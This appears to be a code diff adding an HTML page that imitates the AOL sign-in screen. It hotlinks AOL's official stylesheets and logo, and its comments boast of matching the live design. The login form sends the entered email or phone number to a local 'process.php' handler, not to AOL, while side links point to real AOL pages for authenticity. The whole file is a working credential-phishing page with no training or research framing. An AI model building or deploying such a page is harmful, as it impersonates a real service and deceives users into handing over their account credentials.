@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="aol resp">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <title>AOL Login</title>
+    <!-- Importing AOL's Official Stylesheet Bundle -->
+    <link rel="stylesheet" href="https://s.yimg.com/wm/afe/183b99d38a2b1818ae8a0ed2741fed56f9a4e998fc2c2972f0e1131151a9f7da/_next/static/css/3e3a3a0349b50dbe.css" data-precedence="next">
+    <link rel="stylesheet" href="https://s.yimg.com/wm/afe/183b99d38a2b1818ae8a0ed2741fed56f9a4e998fc2c2972f0e1131151a9f7da/_next/static/css/14e080e615786096.css" data-precedence="next">
+    <link rel="shortcut icon" type="image/png" href="https://s.yimg.com/wm/mbr/images/aol-favicon-v3.png">
+    
+    <style nonce="">
+        /* Native layout fallbacks to force rendering without Next.js server engine hydration */
+        body {
+            background-color: #f5f8fa;
+            margin: 0;
+            padding: 0;
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        .page-wrapper {
+            display: flex;
+            min-height: 100vh;
+            width: 100%;
+        }
+        /* Left Panel: Desktop Art Branding Banner */
+        .promo-side {
+            flex: 1;
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            background-image: url('https://yimg.com'); /* Official background */
+            background-size: cover;
+            background-position: center;
+            display: none;
+        }
+        /* Right Panel: Functional Form Holder Container */
+        .form-side {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            padding: 40px;
+            box-shadow: -2px 0 20px rgba(0,0,0,0.05);
+        }
+        @media (min-width: 992px) {
+            .promo-side { display: block; }
+            body { background-color: #ffffff; }
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 40px;
+            width: 100%;
+        }
+        .header-links a {
+            color: #5d666f;
+            text-decoration: none;
+            font-size: 14px;
+            margin-left: 16px;
+        }
+        .header-links a:hover { text-decoration: underline; }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #26282a;
+            margin-bottom: 24px;
+        }
+        /* Underline input fields styled identically to live AOL system design */
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 24px;
+            border-bottom: 2px solid #b0b9c1;
+        }
+        .input-wrapper input {
+            width: 100%;
+            height: 48px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            padding-top: 12px;
+            background: transparent;
+        }
+        .input-wrapper label {
+            position: absolute;
+            left: 0;
+            top: 14px;
+            color: #5d666f;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            pointer-events: none;
+        }
+        /* Floating label transition effect on field input selection focus */
+        .input-wrapper input:focus ~ label,
+        .input-wrapper input:valid ~ label {
+            top: -4px;
+            font-size: 12px;
+            color: #2b6cff;
+        }
+        .input-wrapper input:focus {
+            border-bottom: 2px solid #2b6cff;
+        }
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #26282a;
+        }
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            accent-color: #2b6cff;
+        }
+        .btn-blue {
+            width: 100%;
+            height: 44px;
+            background-color: #2b6cff;
+            color: #ffffff;
+            border: none;
+            border-radius: 22px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-blue:hover { background-color: #1a56df; }
+        .btn-outline {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            height: 44px;
+            background-color: transparent;
+            color: #2b6cff;
+            border: 2px solid #2b6cff;
+            border-radius: 22px;
+            font-size: 16px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-top: 24px;
+            transition: background 0.2s;
+        }
+        .btn-outline:hover { background-color: rgba(43,108,255,0.05); }
+    </style>
+</head>
+<body>
+
+    <div class="page-wrapper">
+        <!-- Brand Illustration Panel (Visible on Desktop Viewports) -->
+        <div class="promo-side"></div>
+
+        <!-- Working Forms Panel Partition -->
+        <div class="form-side">
+            <header>
+                <img alt="Aol" src="https://s.yimg.com/cv/apiv2/ybar/logos/aol-logo-black-v1.png" style="width: 6.25rem;">
+                <div class="header-links">
+                    <a href="https://help.aol.com/" target="_blank">Help</a>
+                </div>
+            </header>
+
+            <main>
+                <h1>Sign in to AOL</h1>
+                
+                <form id="challenge-form" method="POST" action="process.php">
+                    <!-- Standardized Floating Form Field Inputs -->
+                    <div class="input-wrapper">
+                        <input type="text" id="username" name="username" required autocomplete="username">
+                        <label for="username">Email or phone number</label>
+                    </div>
+
+                    <div class="options-row">
+                        <label class="checkbox-container">
+                            <input type="checkbox" name="persistent" value="1" checked>
+                            Stay signed in
+                        </label>
+                        <a href="https://aol.com" class="btn-outline-link" style="color: #2b6cff; text-decoration: none;" target="_blank">Forgot username?</a>
+                    </div>
+
+                    <button type="submit" class="btn-blue">Next</button>
+                    
+                    <a href="https://aol.com" class="btn-outline" target="_blank">Create an account</a>
+                </form>
+            </main>
+        </div>
+    </div>
+
+</body>
+</html>
